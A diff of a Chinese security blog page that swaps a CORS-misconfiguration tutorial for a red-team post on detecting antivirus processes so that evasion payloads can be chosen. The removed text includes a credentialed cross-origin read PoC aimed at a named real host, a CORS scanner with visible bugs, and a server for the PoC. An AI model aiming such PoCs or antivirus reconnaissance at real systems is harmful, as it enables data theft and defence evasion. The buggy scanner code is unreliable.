@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="CORS漏洞（2）：跨域资源共享漏洞, 域名之外">
-    <meta name="description" content="CORS的出现是为了弥补同源策略的不足，它是一种用来绕过同源策略来实现跨域资源访问的一种技术。">
+    <meta name="keywords" content="杀软识别-脚本开发(2)：思路和代码, 域名之外">
+    <meta name="description" content="针对不同杀软，不同的免杀马的过的概率不一样。 所以要先识别Windows系统进程中的杀毒软件，快速发现并为后续绕过做准备。😳😳😳">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>CORS漏洞（2）：跨域资源共享漏洞 | 域名之外</title>
+    <title>杀软识别-脚本开发(2)：思路和代码 | 域名之外</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
     <style>
@@ -325,12 +325,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">CORS漏洞（2）：跨域资源共享漏洞</h1>
+                    <h1 class="description center-align post-title">杀软识别-脚本开发(2)：思路和代码</h1>
                 </div>
             </div>
         </div>
@@ -354,8 +354,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E6%BC%8F%E6%B4%9E/">
-                                <span class="chip bg-color">漏洞</span>
+                            <a href="/tags/python/">
+                                <span class="chip bg-color">python</span>
+                            </a>
+                        
+                            <a href="/tags/%E7%BA%A2%E9%98%9F%E5%BC%80%E5%8F%91/">
+                                <span class="chip bg-color">红队开发</span>
                             </a>
                         
                     </div>
@@ -366,8 +370,12 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/Web%E5%AE%89%E5%85%A8/" class="post-category">
-                                Web安全
+                            <a href="/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/" class="post-category">
+                                红蓝对抗
+                            </a>
+                        
+                            <a href="/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/python/" class="post-category">
+                                python
                             </a>
                         
                     </div>
@@ -379,7 +387,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-04-27
+                    2023-03-12
                 </div>
                 
 
@@ -400,71 +408,17 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>CORS的出现是为了弥补同源策略的不足，它是一种用来绕过同源策略来实现跨域资源访问的一种技术。</p>
-<span id="more"></span>
+                <p>针对不同杀软，不同的免杀马的过的概率不一样。 所以要先识别Windows系统进程中的杀毒软件，快速发现并为后续绕过做准备。😳😳😳</p>
+<h1 id="杀软识别-脚本开发-2-：思路和代码"><a href="#杀软识别-脚本开发-2-：思路和代码" class="headerlink" title="杀软识别-脚本开发(2)：思路和代码"></a>杀软识别-脚本开发(2)：思路和代码</h1><h3 id="有4个思路："><a href="#有4个思路：" class="headerlink" title="有4个思路："></a>有4个思路：</h3><h5 id="1：python【tasklist-SVC-的内容粘贴到本地tasklist-txt-进行对比】"><a href="#1：python【tasklist-SVC-的内容粘贴到本地tasklist-txt-进行对比】" class="headerlink" title="1：python【tasklist &#x2F;SVC  的内容粘贴到本地tasklist.txt  进行对比】"></a>1：python【tasklist &#x2F;SVC  的内容粘贴到本地tasklist.txt  进行对比】</h5><h5 id="2：tasklist-SVC-的内容传递给-Cobaltstrike-【开发插件：cna】"><a href="#2：tasklist-SVC-的内容传递给-Cobaltstrike-【开发插件：cna】" class="headerlink" title="2：tasklist &#x2F;SVC  的内容传递给 Cobaltstrike 【开发插件：cna】"></a>2：tasklist &#x2F;SVC  的内容传递给 Cobaltstrike 【开发插件：cna】</h5><h5 id="3：复制粘贴在网页识别【-php-等】"><a href="#3：复制粘贴在网页识别【-php-等】" class="headerlink" title="3：复制粘贴在网页识别【.php 等】"></a>3：复制粘贴在网页识别【.php 等】</h5><h5 id="4：exe工具合集-复制粘贴识别"><a href="#4：exe工具合集-复制粘贴识别" class="headerlink" title="4：exe工具合集  复制粘贴识别"></a>4：exe工具合集  复制粘贴识别</h5><h4 id="各有各的优点和局限性。"><a href="#各有各的优点和局限性。" class="headerlink" title="各有各的优点和局限性。"></a>各有各的优点和局限性。</h4><p>只有cobaltstrike是一键化的，最方便。但是前锋马不一定是CS上的。 不一定用上。</p>
+<p>其他三个方法 能一直用上。</p>
+<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><h5 id="用法："><a href="#用法：" class="headerlink" title="用法："></a>用法：</h5><p>python identify_anti_virus.py</p>
+<p>受害主机  tasklist &#x2F;SVC  的内容需要粘贴到tasklist.txt中</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/image-20240310133510464.png" alt="image-20240310133510464"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/image-20240310133829347.png" alt="image-20240310133829347"></p>
+<h5 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(&quot;杀软识别小脚本            by  highgerms&quot;)</span><br><span class="line">print(&quot;&quot;)</span><br><span class="line"></span><br><span class="line">with open(&#x27;tasklist.txt&#x27;, &#x27;r&#x27;) as tasklist_file:</span><br><span class="line">    tasklist_lines = [line.strip() for line in tasklist_file]</span><br><span class="line"></span><br><span class="line">with open(&#x27;anti_virus.txt&#x27;, &#x27;r&#x27;) as antivirus_file:</span><br><span class="line">    antivirus_lines = [line.strip() for line in antivirus_file]</span><br><span class="line"></span><br><span class="line">for task_line in tasklist_lines:</span><br><span class="line">    target = task_line.split(&#x27; &#x27;)[0]</span><br><span class="line"></span><br><span class="line">    for antivirus_line in antivirus_lines:</span><br><span class="line">        antivirus_name = antivirus_line.split(&#x27;\&quot;&#x27;)[1]</span><br><span class="line"></span><br><span class="line">        if target == antivirus_name:</span><br><span class="line">            result = antivirus_line.split(&#x27;\&quot;&#x27;)[3]</span><br><span class="line">            if result:</span><br><span class="line">                print(&quot;进程：&quot;,target,&quot; 杀毒软件:&quot;, result,)</span><br><span class="line">            else:</span><br><span class="line">                print(&quot;无杀软或未识别到杀软(记得及时更新anti_virus)&quot;)</span><br><span class="line">            break  # 结果已找到，跳出内层循环</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<h3 id="CORS-跨域资源共享-概念介绍"><a href="#CORS-跨域资源共享-概念介绍" class="headerlink" title="CORS 跨域资源共享 概念介绍"></a>CORS 跨域资源共享 概念介绍</h3><p>Cors（Cross-origin resource sharing，”跨域资源共享”）的出现是用来弥补SOP（同源策略）的不足。在当时SOP有些限制了网页的业务需求，不能够使不同域的网页互相访问，因此提出了Cors：用于绕过SOP（同源策略）来实现跨域资源访问的一种技术。</p>
-<p>Cors漏洞就是攻击者利用Cors（跨域资源共享）技术来获取用户的敏感数据，从而导致用户敏感信息泄露。</p>
-<p>它允许浏览器向跨源服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制。</p>
-<h3 id="CORS分类："><a href="#CORS分类：" class="headerlink" title="CORS分类："></a>CORS分类：</h3><p>Cors请求可分为两类，简单请求和非简单请求。</p>
-<p><strong>简单请求和非简单请求不影响漏洞，漏洞产生原因在于没有对请求源做严格限制。</strong></p>
-<h4 id="1：非简单请求"><a href="#1：非简单请求" class="headerlink" title="1：非简单请求"></a>1：非简单请求</h4><p>非简单请求就是在正式请求之前，先进行预检请求，询问服务器该域名是否在服务器可请求名单中，得到答复后再执行。</p>
-<h4 id="2：简单请求"><a href="#2：简单请求" class="headerlink" title="2：简单请求"></a>2：简单请求</h4><p>简单请求就是浏览器直接发出cors请求，就是在头信息中直接加个Origin字段。</p>
-<p>所谓简单请求，就是请求方式为GET，POST，HEAD这三种之一，并且HTTP头不超出（Accept，Accept-Language，Content-Language，Lat-Event-ID，Content-Type）这几种字段【应该没有涵盖全】。</p>
-<p>当浏览器发现服务器的请求为简单请求时，会在头信息里加入Origin字段。Origin字段代表此次请求来自哪个域，服务器就可以检验是否来自该域。如果匹配，服务器就会在响应里增添几个字段：</p>
-<p><code>Access-Control-Allow-Origin</code> 规定服务器资源允许被哪些域访问</p>
-<p><code>Access-Control-Allow-Credentials</code>   请求中是否允许发送cookie</p>
-<p><code>Access-Control-Expose-Headers</code> 允许跨域请求发送额外的headers字段</p>
-<p><code>Access-Control-Request-Method</code>  哪些请求类型是被允许的</p>
-<p><code>Access-Control-Max-Age</code>  指定本次请求的有效期</p>
-<p>其中响应中的<code> Access-Control-Allow-Origin</code>是必须有的（它指示了目标域接受来自哪个域的跨域请求，即允许哪个域访问），而剩下几个可有可无。</p>
-<p>当字段值为‘*’时，就代表任意域都可以访问，这样就导致了Cors漏洞的产生。</p>
-<p>而<code> Access-Control-Allow-Origin</code>这个头的值是在目标域的服务端进行配置的，一般这个头的值都会设计成一个白名单，而这个白名单的设计方式就是通过正则实现<strong>（记住：有正则的地方就会有绕过的！）</strong></p>
-<p>而一些都根本没有考虑这个问题，如下图：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/image-20230427112223155.png" alt="image-20230427112223155"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请求包</span><br><span class="line">Origin: https://www.baidu.com</span><br><span class="line"></span><br><span class="line">响应包</span><br><span class="line">Access-Control-Allow-Origin: https://www.baidu.com</span><br></pre></td></tr></table></figure>
-
-<p>POC如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">function loadXMLDoc()</span><br><span class="line">&#123;</span><br><span class="line">    var xhr = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">    xhr.onreadystatechange=function()</span><br><span class="line">    &#123;</span><br><span class="line">        if(xhr.readyState == 4 &amp;&amp; xhr.status == 200) //if receive xhr response</span><br><span class="line">        &#123;</span><br><span class="line">            var datas=xhr.responseText;</span><br><span class="line">            alert(datas);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //request vuln page</span><br><span class="line">    xhr.open(&quot;GET&quot;,&quot;http://www.target.com&quot;,&quot;true&quot;) //网页地址</span><br><span class="line">    xhr.send();</span><br><span class="line">&#125;</span><br><span class="line">loadXMLDoc();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这是一段HTML代码，其中包含了一个脚本（JavaScript），用于向特定网址发出XMLHttpRequest请求，并在收到响应后显示响应数据。下面对代码进行逐行解释：</span><br><span class="line"></span><br><span class="line">- `&lt;!DOCTYPE&gt;`：这是文档类型声明，指定该HTML文档遵循的标准类型。</span><br><span class="line">- `&lt;html&gt;`：这是HTML文档的根元素，定义了整个文档的结构。</span><br><span class="line">- `&lt;script type=&quot;text/javascript&quot;&gt;`：这是一个脚本元素，指示该元素包含JavaScript代码。`type`属性指定脚本语言的类型，这里是JavaScript。</span><br><span class="line">- `function loadXMLDoc()`：这是一个JavaScript函数，它封装了向指定地址发出XMLHttpRequest请求的逻辑。</span><br><span class="line">- `var xhr = new XMLHttpRequest();`：这是创建一个XMLHttpRequest对象，可以通过它来向服务器发送HTTP请求并接收响应。</span><br><span class="line">- `xhr.onreadystatechange=function() &#123; ... &#125;`：这是为XMLHttpRequest对象添加一个事件监听器。当服务器返回响应时，该事件监听器将调用一个匿名函数进行处理。</span><br><span class="line">- `if(xhr.readyState == 4 &amp;&amp; xhr.status == 200)`：这是判断服务器响应是否成功的条件。`readyState`属性表示当前XMLHttpRequest对象的状态，4代表已经收到所有响应数据；`status`属性表示服务器返回的状态码，200代表请求成功。</span><br><span class="line">- `var datas=xhr.responseText;`：如果服务器响应成功，将响应数据赋值给变量`datas`。</span><br><span class="line">- `alert(datas);`：在浏览器中弹出一个警示框，显示接收到的响应数据。</span><br><span class="line">- `xhr.open(&quot;GET&quot;,&quot;http://www.target.com&quot;,&quot;true&quot;)`：向指定地址发出GET请求。第一参数是请求方法，第二个参数是请求URL地址，第三个参数是是否异步发送请求（true表示异步，false表示同步）。</span><br><span class="line">- `xhr.send();`：将XMLHttpRequest对象的请求发送到服务器端。</span><br><span class="line"></span><br><span class="line">综上，这段HTML代码定义了一个函数`loadXMLDoc()`，它通过XMLHttpRequest发送HTTP请求，接收并处理服务器返回的响应数据。然后通过调用该函数来执行请求和响应的过程。</span><br><span class="line"></span><br><span class="line">这是一段包含 JavaScript 和 HTML 代码的 web 页面。具体来说，这个页面创建了一个名为 loadXMLDoc 的 JavaScript 函数，该函数使用 AJAX（Asynchronous JavaScript and XML）技术从指定的 URL 获取数据并在获取到响应后显示弹出窗口。</span><br><span class="line"></span><br><span class="line">更具体地说，当页面加载时，函数 loadXMLDoc 将被调用。该函数首先创建了一个 XMLHttpRequest 对象 xhr，然后对其进行配置以发送 HTTP GET 请求。请求的 URL 是 &quot;http://www.target.com&quot;，即目标网站的地址。在发送请求之后，函数设置了 onreadystatechange 事件处理程序，以便在接收到响应后执行一些操作。</span><br><span class="line"></span><br><span class="line">当 xhr.readyState 变为 4 且 xhr.status 等于 200 时，意味着服务器已经成功地响应了该请求，并且返回了数据。此时，函数从 xhr.responseText 属性中获取数据，然后在弹出窗口中将其显示出来。</span><br><span class="line"></span><br><span class="line">需要注意的是，这段代码仅仅是一个示例，它只是展示了如何使用 AJAX 技术从服务器获取数据，而没有考虑安全性。如果直接在实际的项目中使用这段代码，可能会存在一些潜在的安全风险，比如 CSRF（跨站点请求伪造）攻击等。因此，在实际开发中，应该考虑更加严格的安全措施。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因"></a>漏洞产生原因</h3><p>配置不当，没有限制请求的源，例如Access-Control-Allow-Origin 设置为*，允许任意源请求访问 ，或设置请求源的域名没有完整，没有对请求源的域做严格限制，导致任意源都可以访问，造成cors漏洞。</p>
-<h3 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h3><p>例如某一站点没有对请求源的域做严格限制，这时候攻击者制作一个恶意页面让目标去点击，目标点击后攻击者就可以获取到当前目标所在页面的信息。</p>
-<h3 id="挖掘思路"><a href="#挖掘思路" class="headerlink" title="挖掘思路"></a>挖掘思路</h3><p>根据上方CORS跨域漏洞出现的请求包特征，burp中可以自动添加origin头寻找CORS配置错误，</p>
-<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/image-20230427121654336.png" alt="image-20230427121654336"></p>
-<p>改了之后一些请求包会不在burp数据流中，导致失败。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/image-20230427121924413.png" alt="image-20230427121924413"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/image-20230427122140632.png" alt="image-20230427122140632"></p>
-<p>查看是否存在get请求的json形式敏感信息，在请求头中添加任意Origin值，如<a href="https://evil.com，查看返回头是否返回：Access-Control-Allow-Origin:https://evil.com和Access-Control-Allow-Credentials：true，若返回，则构造poc.html进行跨域读取数据。">https://evil.com，查看返回头是否返回：Access-Control-Allow-Origin:https://evil.com和Access-Control-Allow-Credentials：true，若返回，则构造poc.html进行跨域读取数据。</a></p>
-<h5 id="一个探测cors的py脚本"><a href="#一个探测cors的py脚本" class="headerlink" title="一个探测cors的py脚本"></a>一个探测cors的py脚本</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">import requests</span><br><span class="line">from threading import Thread,activeCount</span><br><span class="line">from queue import Queue</span><br><span class="line">from sys import argv</span><br><span class="line"></span><br><span class="line">def cors_test(domain):</span><br><span class="line">        if &#x27;http://&#x27; or &#x27;https://&#x27; not in domain:</span><br><span class="line">                domain = &#x27;http://&#x27; + domain.strip()</span><br><span class="line">        try:</span><br><span class="line">                characters = &#x27;!@#$%^&amp;*()_+~/*&#x27;</span><br><span class="line">                headers = &#123;</span><br><span class="line">                &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36&#x27;,</span><br><span class="line">                &#x27;Origin&#x27;: &#x27;&#123;&#125;&#x27;.format(&#x27;http://www.abc.com&#x27;)</span><br><span class="line">                &#125;</span><br><span class="line">                req1 = requests.get(domain,headers=headers,timeout=(5,20),verify=False,allow_redirects=False)</span><br><span class="line">                if &quot;Access-Control-Allow-Origin&quot; and &quot;Access-Control-Allow-Credentials&quot; in req1.headers:</span><br><span class="line">                        if req1.headers[&#x27;Access-Control-Allow-Origin&#x27;] == headers[&#x27;Origin&#x27;]:</span><br><span class="line">                                print(&#x27;[+]Mode 1：CORS Found &#123;&#125; &#123;&#125; &#123;&#125;&#x27;.format(domain.replace(&#x27;http://&#x27;,&#x27;&#x27;),req1.headers[&#x27;Access-Control-Allow-Origin&#x27;],req1.headers[&#x27;Access-Control-Allow-Credentials&#x27;]))</span><br><span class="line">                                with open(&#x27;cors_success.txt&#x27;,&#x27;a+&#x27;) as f:</span><br><span class="line">                                        f.write(&#x27;&#123;&#125; &#123;&#125; &#123;&#125; \n&#x27;.format(domain.replace(&#x27;http://&#x27;,&#x27;&#x27;),req1.headers[&#x27;Access-Control-Allow-Origin&#x27;],req1.headers[&#x27;Access-Control-Allow-Credentials&#x27;]))</span><br><span class="line">                        else:</span><br><span class="line">                                headers[&#x27;Origin&#x27;] = domain + &#x27;.baidu.com&#x27;</span><br><span class="line">                                req2 = requests.get(domain,headers=headers,timeout=(5,20),verify=False,allow_redirects=False)</span><br><span class="line">                                if req2.headers[&#x27;Access-Control-Allow-Origin&#x27;] == headers[&#x27;Origin&#x27;]:</span><br><span class="line">                                        print(&#x27;[+]Mode 2：CORS Found &#123;&#125; &#123;&#125; &#123;&#125;&#x27;.format(domain.replace(&#x27;http://&#x27;,&#x27;&#x27;),req2.headers[&#x27;Access-Control-Allow-Origin&#x27;],req2.headers[&#x27;Access-Control-Allow-Credentials&#x27;]))</span><br><span class="line">                                        with open(&#x27;cors_success.txt&#x27;,&#x27;a+&#x27;) as f:</span><br><span class="line">                                                f.write(&#x27;&#123;&#125; &#123;&#125; &#123;&#125; \n &#x27;.format(domain.replace(&#x27;http://&#x27;,&#x27;&#x27;),req2.headers[&#x27;Access-Control-Allow-Origin&#x27;],req2.headers[&#x27;Access-Control-Allow-Credentials&#x27;]))</span><br><span class="line">                                else:</span><br><span class="line">                                        for character in characters:</span><br><span class="line">                                                headers[&#x27;Origin&#x27;] = domain + character + &#x27;.baidu.com&#x27;</span><br><span class="line">                                                req3 = requests.get(domain,headers=headers,timeout=(5,20),verify=False,allow_redirects=False)</span><br><span class="line">                                                if req3.headers[&#x27;Access-Control-Allow-Origin&#x27;] == headers[&#x27;Origin&#x27;]:</span><br><span class="line">                                                        print(&#x27;[+]Mode 3：CORS Found &#123;&#125; &#123;&#125; &#123;&#125;&#x27;.format(domain.replace(&#x27;http://&#x27;,&#x27;&#x27;),req3.headers[&#x27;Access-Control-Allow-Origin&#x27;],req3.headers[&#x27;Access-Control-Allow-Credentials&#x27;]))</span><br><span class="line">                                                        with open(&#x27;cors_success.txt&#x27;,&#x27;a+&#x27;) as f:</span><br><span class="line">                                                                f.write(&#x27;&#123;&#125; &#123;&#125; &#123;&#125; \n&#x27;).format(domain.replace(&#x27;http://&#x27;,&#x27;&#x27;),req3.headers[&#x27;Access-Control-Allow-Origin&#x27;],req3.headers[&#x27;Access-Control-Allow-Credentials&#x27;])</span><br><span class="line">                                                else:</span><br><span class="line">                                                        if req.headers[&#x27;Access-Control-Allow-Origin&#x27;]:</span><br><span class="line">                                                                print(&#x27;[+]maybe CORS Found &#123;&#125; &#123;&#125; &#123;&#125;&#x27;.format(domain.replace(&#x27;http://&#x27;,&#x27;&#x27;),req3.headers[&#x27;Access-Control-Allow-Origin&#x27;],req3.headers[&#x27;Access-Control-Allow-Credentials&#x27;]))</span><br><span class="line"></span><br><span class="line">        except Exception as e:</span><br><span class="line">                print(&#x27;[-]&#x27; + domain.replace(&#x27;http://&#x27;,&#x27;&#x27;) + &#x27; &#x27; +  str(e))</span><br><span class="line">                pass</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">        try:</span><br><span class="line">                if argv[1]:</span><br><span class="line">                        queue = Queue()</span><br><span class="line">                        filename = open(argv[1],&#x27;r+&#x27;)</span><br><span class="line">                        for url in filename:</span><br><span class="line">                                queue.put(url.strip())</span><br><span class="line">                        filename.close()</span><br><span class="line">                        while queue.qsize()&gt;0:</span><br><span class="line">                                if activeCount()&lt;= 10:</span><br><span class="line">                                        Thread(target=cors_test,args=(queue.get(),)).start()</span><br><span class="line">        except IndexError:</span><br><span class="line">                print(&#x27;Usage：python3 cors_test.py filename.txt&#x27;)</span><br></pre></td></tr></table></figure>
-
-
-
-<h5 id="serve-js"><a href="#serve-js" class="headerlink" title="serve.js"></a>serve.js</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var http = require(&#x27;http&#x27;);</span><br><span class="line">var url  = require(&#x27;url&#x27;);</span><br><span class="line">var fs   = require(&#x27;fs&#x27;);</span><br><span class="line">var port = 80</span><br><span class="line"></span><br><span class="line">http.createServer(function(req, res) &#123;</span><br><span class="line">    if (req.url == &#x27;/cors-poc&#x27;) &#123;</span><br><span class="line">        fs.readFile(&#x27;cors.html&#x27;, function(err, data) &#123;</span><br><span class="line">            res.writeHead(200, &#123;&#x27;Content-Type&#x27;:&#x27;text/html&#x27;&#125;);</span><br><span class="line">            res.write(data);</span><br><span class="line">            res.end();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        res.writeHead(200, &#123;&#x27;Content-Type&#x27;:&#x27;text/html&#x27;&#125;);</span><br><span class="line">        res.write(&#x27;never gonna give you up...&#x27;);</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;).listen(port, &#x27;0.0.0.0&#x27;);</span><br><span class="line">console.log(`Serving on port $&#123;port&#125;`);</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<p>利用步骤大概如下：</p>
-<ul>
-<li>准备一个开启了泛解析的域名，这个域名指向你的主机</li>
-<li>NodeJS</li>
-</ul>
-<p>为啥要准备NodeJS呢？</p>
-<p>因为Apache和Nginx对这些有特殊字符的域名支持都不太好，所以，我们直接用NodeJS在我们的主机上搭建一个Server比较好</p>
-<p>然后在同目录下创建一个<code>cors.html</code></p>
-<h5 id="cors-html"><a href="#cors-html" class="headerlink" title="cors.html"></a>cors.html</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;CORS&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body onload=&quot;cors();&quot;&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">cors proof-of-concept:&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;textarea rows=&quot;10&quot; cols=&quot;60&quot; id=&quot;pwnz&quot;&gt;</span><br><span class="line">&lt;/textarea&gt;&lt;br&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">function cors() &#123;</span><br><span class="line">  var xhttp = new XMLHttpRequest();</span><br><span class="line">  xhttp.onreadystatechange = function() &#123;</span><br><span class="line">    if (this.readyState == 4 &amp;&amp; this.status == 200) &#123;</span><br><span class="line">      document.getElementById(&quot;pwnz&quot;).innerHTML = this.responseText;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  xhttp.open(&quot;GET&quot;, &quot;https://gateway-q.test.xdf.cn/hr-permission-web/auth/permission/loginUserPermission&quot;, true);</span><br><span class="line">  xhttp.withCredentials = true;</span><br><span class="line">  xhttp.send();</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>1.不要将Access-Control-Allow-Origin字段设置为*</p>
-<p>2.严格校验Origin字段的值</p>
-<p>3.HTTPS 网站不要信任HTTP 域</p>
-<p>4.不要信任全部自身子域，减少攻击面</p>
-<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/eayXNlhiNO7TEaF8S9ZZKA">https://mp.weixin.qq.com/s/eayXNlhiNO7TEaF8S9ZZKA</a>   CORS配置不当—挖掘技巧及实战案例全汇总</p>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/323358.html">https://www.freebuf.com/vuls/323358.html</a>   CORS漏洞详解</p>
+<h3 id="Cobaltstrike-cna插件开发"><a href="#Cobaltstrike-cna插件开发" class="headerlink" title="Cobaltstrike cna插件开发"></a>Cobaltstrike cna插件开发</h3><p>Cobalt Strike的Aggressor脚本（.cna文件）是用一种名为Sleep的脚本语言编写的。Sleep语言是一种简洁的、动态类型的、类似Perl和JavaScript的语言。</p>
+<p>我了解下用法，下篇文章写。😋😋😋😋</p>
 
                 
             </div>
@@ -491,7 +445,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://highgerms.github.io/2023/04/27/CORS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">http://highgerms.github.io/2023/04/27/CORS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</a>
+                    <a href="http://highgerms.github.io/2023/03/12/%E6%9D%80%E8%BD%AF%E8%AF%86%E5%88%AB-%E8%84%9A%E6%9C%AC%E5%BC%80%E5%8F%91(2)%EF%BC%9A%E6%80%9D%E8%B7%AF%E5%92%8C%E4%BB%A3%E7%A0%81/">http://highgerms.github.io/2023/03/12/%E6%9D%80%E8%BD%AF%E8%AF%86%E5%88%AB-%E8%84%9A%E6%9C%AC%E5%BC%80%E5%8F%91(2)%EF%BC%9A%E6%80%9D%E8%B7%AF%E5%92%8C%E4%BB%A3%E7%A0%81/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -529,8 +483,12 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E6%BC%8F%E6%B4%9E/">
-                                    <span class="chip bg-color">漏洞</span>
+                                <a href="/tags/python/">
+                                    <span class="chip bg-color">python</span>
+                                </a>
+                            
+                                <a href="/tags/%E7%BA%A2%E9%98%9F%E5%BC%80%E5%8F%91/">
+                                    <span class="chip bg-color">红队开发</span>
                                 </a>
                             
                         </div>
@@ -628,30 +586,34 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/04/26/%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%20CORS/">
+                <a href="/2023/03/10/%E6%9D%80%E8%BD%AF%E8%AF%86%E5%88%AB-%E8%84%9A%E6%9C%AC%E5%BC%80%E5%8F%91(1)%EF%BC%9A%E6%9D%80%E8%BD%AF%E8%BF%9B%E7%A8%8B%E4%B8%8E%E5%90%8D%E7%A7%B0%E5%8E%BB%E9%87%8D%E6%B8%85%E6%B4%97/">
                     <div class="card-image">
                         
-                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="CORS漏洞（1）：前置知识">
+                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="杀软识别-脚本开发(1)：杀软进程与名称去重清洗">
                         
-                        <span class="card-title">CORS漏洞（1）：前置知识</span>
+                        <span class="card-title">杀软识别-脚本开发(1)：杀软进程与名称去重清洗</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            cors跨域资源共享漏洞的前置知识：同源概念、同源要素、跨域、JSONP等基础内容。
+                            针对不同杀软，不同的免杀马的过的概率不一样。 所以要先识别Windows系统进程中的杀毒软件，快速发现并为后续绕过做准备。😳😳😳
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-04-26
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-03-10
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Web%E5%AE%89%E5%85%A8/" class="post-category">
-                                    Web安全
+                            <a href="/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/" class="post-category">
+                                    红蓝对抗
+                                </a>
+                            
+                            <a href="/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/python/" class="post-category">
+                                    python
                                 </a>
                             
                             
@@ -661,12 +623,12 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E6%BC%8F%E6%B4%9E/">
-                        <span class="chip bg-color">漏洞</span>
+                    <a href="/tags/python/">
